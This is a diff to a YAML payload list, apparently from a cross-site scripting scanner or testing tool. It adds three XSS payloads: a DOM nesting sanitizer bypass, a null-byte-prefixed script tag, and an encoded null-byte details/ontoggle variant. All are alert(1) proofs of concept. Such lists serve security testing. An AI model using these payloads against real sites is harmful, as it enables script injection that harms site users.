@@ -36,6 +36,12 @@ payloads:
     - '<input onfocus=alert(1) autofocus>'
     - '<!--<img src=x onerror=alert(1)>-->'
     - '<xss onmouseover=alert(1)>hover</xss>'
+    # DOM nesting bypass (select > button > noscript chain)
+    - '<select><button><noscript><selectedcontent></selectedcontent></noscript></button><option><style></noscript><img src=x onerror=alert(1)></style></option></select>'
+    # null-byte prefix to bypass sanitizer
+    - '<%00><script>alert(1)</script>'
+    # encoded null-byte + details/ontoggle
+    - '<%001%5c%2a<script%2fx><details/open ontoggle=alert(1)>'
 
   dom:
     - 'javascript:alert(document.domain)'
